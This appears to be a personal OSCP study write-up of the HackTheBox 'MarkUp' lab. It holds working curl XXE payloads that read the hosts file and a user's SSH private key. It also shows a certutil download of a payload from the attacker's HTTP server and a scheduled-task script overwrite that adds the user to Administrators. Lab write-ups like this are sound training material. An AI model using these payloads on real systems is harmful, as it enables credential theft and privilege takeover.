---
tags: [oscp, boxes, htb, windows, completed]
platform: HackTheBox
os: Windows
ip: 10.129.95.192
difficulty: Easy
status: complete
---

# HTB: MarkUp, Full Walkthrough (XXE File Read → SSH Key → Writable Scheduled Task Script)

## Tags
#HTB #MarkUp #Windows #XXE #XMLExternalEntity #SSHKey #ScheduledTask #InsecureFilePermissions #DefaultCreds #Easy

---

## Box Info

**Target:** `$BoxIP` (swap for your instance IP) · **Difficulty:** Easy · **OS:** Windows Server 2019 (10.0.17763.107) · **Platform:** HackTheBox

**The gist:** Windows box running Apache/PHP with a custom shopping app called MegaShopping. The app has a default credential problem (`admin:password`) and an order form that builds XML client-side and POSTs it raw to `process.php`. PHP's libxml2 processes external entities by default in older configs, so injecting a DOCTYPE lets us read arbitrary files off the server. We target `C:\Users\Daniel\.ssh\id_rsa` — Daniel's name is leaked in an HTML comment — and SSH in with the extracted key. Privesc is a scheduled task running `C:\Log-Management\job.bat` under a privileged account, with `BUILTIN\Users:(F)` explicitly set on the file. We replace the script with a `net localgroup administrators daniel /add` one-liner, wait for the task to fire, and gain admin access.

---

## 1. Recon: Port Scan

**Full port scan:**
```bash
sudo nmap -Pn -n -sT -p- --min-rate 5000 $BoxIP -oN nmap/${BoxName}_allports.txt
```

Open ports:

| Port | Service |
|---|---|
| 22/tcp | OpenSSH for Windows 8.1 |
| 80/tcp | Apache 2.4.41 (Win64) PHP 7.2.28 — MegaShopping |
| 443/tcp | Apache 2.4.41 (Win64) PHP 7.2.28 — MegaShopping (HTTPS) |

![[1.1nmap-svcscan.png]]

**Service scan:**
```bash
sudo nmap -sC -sV -p 22,80,443 $BoxIP -oA nmap/${BoxName}_services
```

Key findings:
- Port 22: `OpenSSH for_Windows_8.1` — confirms Windows target. SSH is post-foothold access, not the initial attack surface.
- Port 80/443: Apache 2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28. App title: MegaShopping. `PHPSESSID` cookie has no `httponly` flag. SSL cert is self-signed, expired, `CN=localhost` — dev configuration.
- UDP: top 100 all filtered. TCP-only attack surface.

**Searchsploit:** Nothing applicable for these exact versions. Apache 2.4.41, OpenSSL 1.1.1c, and OpenSSH for Windows 8.1 have no directly exploitable public CVEs for our configuration. The one PHP result matching Windows (CVE-2024-4577) targets PHP 8.x only — our target runs 7.2.28. Vulnerability is in the application, not the framework.

---

## 2. Web Enumeration

### Quick checks
```bash
curl -s http://$BoxIP/robots.txt
curl -s http://$BoxIP/sitemap.xml
```

Both 404. Nothing there.

### Login page

Browse to `http://$BoxIP`. Simple login form — POST `username` + `password` to `index.php`. No CSRF token. No version info in source. Footer: "Powered by Megacorp" — custom app, not an off-the-shelf CMS.

### Default credentials

Failed login returns: `HTTP 200` + JS alert "Wrong Credentials". Successful login returns `HTTP 302 → home.php`.

```bash
curl -i -s -c $BoxDir/cookies.txt \
  -d "username=admin&password=admin" \
  http://$BoxIP/
# → 200, Wrong Credentials

curl -i -s -c $BoxDir/cookies.txt \
  -d "username=admin&password=password" \
  http://$BoxIP/
# → 302 Found, location: home.php
```

`admin:password` works.

```bash
loot cred admin password
boxset Username admin
boxset Password password
```

![[4.xxe-basline-proof.png]]

### Directory enumeration

```bash
feroxbuster -u http://$BoxIP/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt,html \
  -o nmap/feroxbuster.txt
```

Notable finds:

| Path | Status | Significance |
|---|---|---|
| `/db.php` | 200, 0 bytes | DB connection include — contains creds, not directly readable |
| `/process.php` | 302 → index.php | Auth-required XML processing endpoint — primary target |
| `/services.php` | 302 → index.php | Auth-required order form |
| `/phpmyadmin` | 403 | Exists, forbidden |

![[2.ferroxbuster.png]]

### Authenticated enumeration — services.php source

```bash
curl -s -b $BoxDir/cookies.txt http://$BoxIP/services.php
```

Two critical findings in the source:

**1. Username leaked in HTML comment:**
```html
<!-- Modified by Daniel : UI-Fix-9092-->
```

```bash
boxset Username Daniel
```

**2. The order form uses XML:**

The form's submit button calls `getXml()` — a JavaScript function that builds an XML document from the form fields and POSTs it to `process.php` with `Content-Type: text/xml`. The `<item>` element value is reflected back in the response. This means we bypass the JS entirely and POST our own XML.

![[3.svc-source.png]]
![[3.1service-source-getxml.png]]

---

## 3. Vulnerability Identification — XXE

**Why we suspect XXE:**

- The app sends raw XML to `process.php` (confirmed from source)
- PHP 7.2.28 uses libxml2, which has external entity processing **enabled by default** — this changed in PHP 8.0. No evidence the developer called `libxml_disable_entity_loader(true)`
- The `<item>` value reflects in the response — confirmed exfiltration point
- This is a hypothesis; we test it before assuming it works

**Baseline test — confirm reflection:**
```bash
curl -i -s -b $BoxDir/cookies.txt \
  -H 'Content-Type: text/xml' \
  --data-raw '<?xml version="1.0"?><order><quantity>1</quantity><item>TESTVALUE</item><address>test</address></order>' \
  http://$BoxIP/process.php
```

Response: `Your order for TESTVALUE has been processed` — reflection confirmed.

> [!warning] 💡 Hint
> **Watch out:** The XML request needs both the authenticated session cookie and the `text/xml` content type. A correct entity can look broken if either detail is missing.

**XXE test — read Windows hosts file:**

Target `C:\Windows\System32\drivers\etc\hosts` first — it always exists. If we get its contents back, external entity loading is enabled.

```bash
curl -i -s -b $BoxDir/cookies.txt \
  -H 'Content-Type: text/xml' \
  --data-raw '<?xml version="1.0"?>
<!DOCTYPE order [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
]>
<order>
  <quantity>1</quantity>
  <item>&xxe;</item>
  <address>test</address>
</order>' \
  http://$BoxIP/process.php
```

Response: `Your order for # Copyright (c) 1993-2009 Microsoft Corp...` — hosts file contents returned. XXE confirmed.

![[4.1.xxe-confirmed.png]]

---

## 4. Foothold — XXE → SSH Key → Shell

### Read Daniel's SSH private key

We know the username is `daniel` (from the HTML comment). Windows OpenSSH stores private keys at `C:\Users\<username>\.ssh\id_rsa`. If Daniel has one and we can read it, we get a shell without needing a password.

```bash
curl -i -s -b $BoxDir/cookies.txt \
  -H 'Content-Type: text/xml' \
  --data-raw '<?xml version="1.0"?>
<!DOCTYPE order [
  <!ENTITY xxe SYSTEM "file:///C:/Users/Daniel/.ssh/id_rsa">
]>
<order>
  <quantity>1</quantity>
  <item>&xxe;</item>
  <address>test</address>
</order>' \
  http://$BoxIP/process.php
```

Response: `Your order for -----BEGIN OPENSSH PRIVATE KEY----- ...` — full private key returned.

![[4.2xxe-ssh-key.png]]

### Save and verify the key

Use awk to extract between PEM markers (avoids manual copy-paste corruption):

```bash
curl -s -b $BoxDir/cookies.txt \
  -H 'Content-Type: text/xml' \
  --data-raw '<?xml version="1.0"?>
<!DOCTYPE order [
  <!ENTITY xxe SYSTEM "file:///C:/Users/Daniel/.ssh/id_rsa">
]>
<order>
  <quantity>1</quantity>
  <item>&xxe;</item>
  <address>test</address>
</order>' \
  http://$BoxIP/process.php | \
  awk '/BEGIN OPENSSH/,/END OPENSSH/' > $BoxDir/loot/daniel_id_rsa

# Strip "Your order for " prefix if it lands on line 1
sed -i 's/Your order for //' $BoxDir/loot/daniel_id_rsa

chmod 600 $BoxDir/loot/daniel_id_rsa
ssh-keygen -y -f $BoxDir/loot/daniel_id_rsa
```

> [!warning] 💡 Hint
> **Watch out:** The response can contain text before the PEM header. Extract only the complete key block and set restrictive permissions before SSH uses it.

`ssh-keygen -y` outputs the public key if the private key is valid. The comment confirms `daniel@Entity`.

![[5.key-verfified.png]]

```bash
loot key $BoxDir/loot/daniel_id_rsa
boxset Username daniel
```

### SSH in

```bash
ssh -i $BoxDir/loot/daniel_id_rsa $Username@$BoxIP
```

```cmd
whoami
hostname
```

Output:
```
markup\daniel
MarkUp
```

![[6.FOOTHOLD.png]]

### User flag

```cmd
type C:\Users\daniel\Desktop\user.txt
```

![[7.userflag.png]]

```bash
loot flag user <value>
```

---

## 5. Privilege Escalation

### Enumeration

```cmd
whoami /all
```

Key findings from `whoami /all`:
- **Groups:** `BUILTIN\Users`, `MARKUP\Web Admins`, `BUILTIN\Remote Management Users`
- **Privileges:** Only `SeChangeNotifyPrivilege` and `SeIncreaseWorkingSetPrivilege` — no `SeImpersonatePrivilege`, no `SeBackupPrivilege`
- **Integrity:** Medium — standard unprivileged user

No token impersonation (Potato attacks), no Backup Operator escalation. Attack surface is file permissions and scheduled tasks.

```cmd
icacls C:\Log-Management /T
```

Output:
```
C:\Log-Management\job.bat BUILTIN\Users:(F)
                          NT AUTHORITY\SYSTEM:(I)(F)
                          BUILTIN\Administrators:(I)(F)
```

`BUILTIN\Users:(F)` on `job.bat` is **explicitly set** — no `(I)` flag, meaning this isn't inherited from the parent directory. Someone deliberately granted Users full control on this specific file. Daniel is in `BUILTIN\Users` → Daniel can overwrite it entirely.



### Why this escalates

`job.bat` is executed by a scheduled task running as a privileged account. The task isn't visible to Daniel (`schtasks /query` only shows Microsoft tasks — Daniel lacks `TASK_QUERY` rights on the custom task), but the explicit ACE exists for a reason. Whatever runs this script runs it with elevated privileges.

**Original job.bat contents:**
```bat
@echo off
FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
IF (%adminTest%)==(Access) goto noAdmin
for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")
echo.
echo Event Logs have been cleared!
goto theEnd
:do_clear
wevtutil.exe cl %1
goto :eof
:noAdmin
echo You must run this script as an Administrator!
:theEnd
exit
```

A Windows Event Log clearing script. The `bcdedit` check detects whether it's running as admin — if not, it exits. **Do not run this manually as Daniel.** It must be triggered by the scheduled task.

> [!warning] 💡 Hint
> **Watch out:** A manual run tests the script as Daniel, not as the scheduled task account. It takes the non-admin branch, so wait for the task trigger instead.

![[9original-jobat.png]]

### Exploit — add Daniel to administrators

Instead of a reverse shell, use a single `net` command. When the task runs as SYSTEM, it adds Daniel to the local Administrators group — no network connection, no timing race, no listener.

On Kali, create both payload and restore files:

```bash
echo '@echo off
net localgroup administrators daniel /add' > $BoxDir/www/markup-rev.bat

cat > $BoxDir/www/markup-job-restore.bat << 'EOF'
@echo off
FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
IF (%adminTest%)==(Access) goto noAdmin
for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")
echo.
echo Event Logs have been cleared!
goto theEnd
:do_clear
wevtutil.exe cl %1
goto :eof
:noAdmin
echo You must run this script as an Administrator!
:theEnd
exit
EOF

www  # serve $BoxDir/www/ on port 80
```

On the target:

```cmd
certutil -urlcache -f http://$LocalIP/markup-rev.bat C:\Users\daniel\markup-rev.bat
copy /Y C:\Users\daniel\markup-rev.bat C:\Log-Management\job.bat
type C:\Log-Management\job.bat
```

Wait for the scheduled task to fire (up to ~5 minutes).

```cmd
net localgroup administrators
```

When `daniel` appears in the Members list, the task has run.

![[privesc-exploit.png]]

### Root flag

With Daniel now in the Administrators group, read the flag directly:

```cmd
dir C:\Users\Administrator\Desktop\
type C:\Users\Administrator\Desktop\root.txt
```

![[11.user-and-root.png]]

```bash
loot flag root <value>
```

---

## 6. Cleanup

On the target:

```cmd
certutil -urlcache -f http://$LocalIP/markup-job-restore.bat C:\Users\daniel\markup-job-restore.bat
copy /Y C:\Users\daniel\markup-job-restore.bat C:\Log-Management\job.bat
type C:\Log-Management\job.bat
del C:\Users\daniel\markup-rev.bat
del C:\Users\daniel\markup-job-restore.bat
```

Verify `job.bat` shows the original event log script. No webshells were uploaded.

On Kali: stop the HTTP server (Ctrl+C on the `www` terminal).

---

## 7. Credentials Found

| Username | Password / Key | Source |
|---|---|---|
| admin | password | Default credentials — MegaShopping login page |
| daniel | SSH private key | XXE file read → `C:\Users\Daniel\.ssh\id_rsa` |

---

## 8. Tools Used

| Tool | Purpose |
|---|---|
| nmap | Port and service scanning |
| feroxbuster | Web directory enumeration |
| curl | Web recon, default cred testing, XXE payloads |
| awk | Extract SSH key from XXE response between PEM markers |
| ssh-keygen -y | Verify extracted private key is valid |
| ssh | Foothold as daniel using extracted key |
| certutil | Download files to Windows target from Kali HTTP server |
| www helper | Serve payload files from $BoxDir/www/ |

---

## 9. Vulnerabilities Summary

| # | Vulnerability | Severity | Location |
|---|---|---|---|
| 1 | Default credentials `admin:password` | Medium | HTTP/80 — MegaShopping login |
| 2 | XXE via XML order form — external entity loading enabled (PHP/libxml2 default) | High | HTTP/80 `/process.php` |
| 3 | SSH private key readable via XXE file read | High | `C:\Users\Daniel\.ssh\id_rsa` |
| 4 | Insecure file permissions — `BUILTIN\Users:(F)` on scheduled task script | High | `C:\Log-Management\job.bat` |

---

## 10. Lessons Learned / Module Links

- **XXE is an app-level bug, not a framework CVE.** Searchsploit found nothing useful for Apache 2.4.41/PHP 7.2.28. The vulnerability is in the application accepting raw XML with no entity restrictions. Older PHP/libxml2 enables external entities by default — a developer has to explicitly call `libxml_disable_entity_loader(true)` to stop it. Fingerprint the tech stack, confirm nothing applies, then enumerate the app. → [[09. Common Web Application Attacks]]

- **HTML comments leak usernames.** `<!-- Modified by Daniel : UI-Fix-9092-->` is the only reason we knew to target `C:\Users\Daniel\.ssh\id_rsa`. Read every page source when enumerating a web app. → [[08. Introduction to Web Application Attacks]]

- **Confirm XXE with a safe file first, then escalate.** Testing with `C:\Windows\System32\drivers\etc\hosts` before going for the SSH key verifies the parser behaviour without burning our best target. If hosts works, escalate. → [[09. Common Web Application Attacks]]

- **Extract multi-line secrets with awk, not copy-paste.** `awk '/BEGIN OPENSSH/,/END OPENSSH/'` reliably extracts PEM-encoded keys from messy response wrappers. Manual copy-paste introduces invisible characters and corrupts keys. Always verify with `ssh-keygen -y` before attempting to use. → general habit

- **For writable-script-as-SYSTEM privesc, a reverse shell is not the simplest primitive.** A `net localgroup administrators $Username /add` one-liner achieves the same goal without a network connection, a listener, timing races, or connection drop issues. When a technique fails three times, stop and ask "what is the actual goal?" then find the simplest primitive. → [[17. Windows Privilege Escalation]]

- **Don't run job.bat manually as Daniel.** The script checks `bcdedit` output for "Access" (the word that appears in "Access denied" when running without admin rights) and exits early. Running it manually confirms the check works, but also closes the cmd session via the `exit` at the end. → [[17. Windows Privilege Escalation]]

- **`BUILTIN\Users:(F)` without `(I)` means deliberate, not inherited.** The `(I)` flag indicates inherited permissions. An explicit ACE without it was set intentionally — that's the signal that it's the intended attack surface, not a misconfiguration in the parent directory. → [[17. Windows Privilege Escalation]]

---

## 11. External Resources

| Resource | Link | Why |
|---|---|---|
| HackTricks — XXE | https://github.com/HackTricks-wiki/hacktricks/blob/master/pentesting-web/xxe-xee-xml-external-entity.md | XXE payload reference, file read via external entity |
| PayloadsAllTheThings — XXE | https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection | XXE payload variants including Windows file paths |
| HackTricks — Windows Privesc | https://github.com/HackTricks-wiki/hacktricks/blob/master/windows-hardening/windows-local-privilege-escalation/README.md | Scheduled task / weak file permissions section |
| GTFOBins | https://gtfobins.github.io | Not directly used, but reference for future Windows binary abuse |
| RevShells | https://www.revshells.com | Reverse shell reference (consulted but not used — net localgroup was simpler) |
| ippsec.rocks | https://ippsec.rocks/?#markup | HTB walkthroughs using XXE technique |

---

## 12. Similar Boxes

| Box | Platform | Technique overlap | Why |
|---|---|---|---|
| DevOops | HTB (Medium) | XXE file read → SSH key | Same XXE to key extraction chain, Linux target |
| Monday | HTB | XML parsing — XXE | Another XML input attack surface |
| ForwardSlash | HTB (Hard) | XXE / SSRF | XXE used for SSRF pivoting, harder variant |
| Optimum | HTB (Easy) | Windows scheduled task privesc | Windows privesc via task/service, good simpler companion |
| Jeeves | HTB (Medium) | Windows privesc — service/task weak perms | Weak file permissions on Windows, similar ACL abuse |

---

## 13. Vault Update Checklist

- [ ] Screenshots in `MarkUp/screenshots/` — confirm all key moments covered
- [ ] Loot: `loot/daniel_id_rsa`, `loot/creds.txt` (admin:password), `loot/flags.txt` (user + root)
- [ ] Log copied to `OSCP/BOXES/BOX LOGS/MarkUp.log`
- [ ] **Stage notes:** Web App - XXE (new or update with Windows file path row + MarkUp source), PrivEsc Windows - Services/Tasks (add writable script row + MarkUp source)
- [ ] **Module notes:** [[09. Common Web Application Attacks]] (+MarkUp, XXE section), [[17. Windows Privilege Escalation]] (+MarkUp, writable scheduled task script)
- [ ] **Hub docs:** Command Appendix (awk PEM extraction, certutil download one-liner), Command Breakdowns (XXE curl payload if not present)
- [ ] MASTER BOX LIST updated
- [ ] FAQ: "why awk not copy-paste for SSH key", "why not run job.bat manually", "why net localgroup beats reverse shell for this privesc type"
